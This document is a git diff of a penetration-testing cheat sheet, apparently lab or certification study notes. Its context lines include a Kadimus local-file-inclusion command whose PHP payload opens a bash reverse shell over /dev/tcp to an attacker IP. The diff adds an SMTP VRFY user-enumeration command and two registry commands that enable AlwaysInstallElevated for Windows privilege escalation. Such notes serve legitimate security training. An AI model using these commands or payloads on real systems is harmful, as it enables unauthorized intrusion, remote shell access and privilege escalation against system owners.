@@ -122,6 +122,11 @@ snmpwalk -v 1 -c public [target ip]
 #CHECK for TFTP (ala stuxnet)
 nmap -sU -p 69 --script tftp-enum.nse [taretIP/name]
 
+#################SMTP ENUMERATION######################
+
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.22
+
+
 #####################################
 # Web Application Enumeration Tools
 #####################################
@@ -185,6 +190,14 @@ mknod /tmp/backpipe p
 #https://github.com/P0cL4bs/Kadimus
 #remember to install dependancies
 ./kadimus -t https://[target]/section.php?page=php://input%00 -C \ '<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.xxx/4444 0>&1 2>&1"); ?>' -X input
+
+
+##########################WINDOWS PRIV ESC
+#set msi's to install with admin rights
+REG ADD HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
+REG ADD HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
+
+
 
 ###################LINUX ENUMERATION#################################
 #ok so ideally use a tool such as linenum.sh however we need to know what to do manualy.
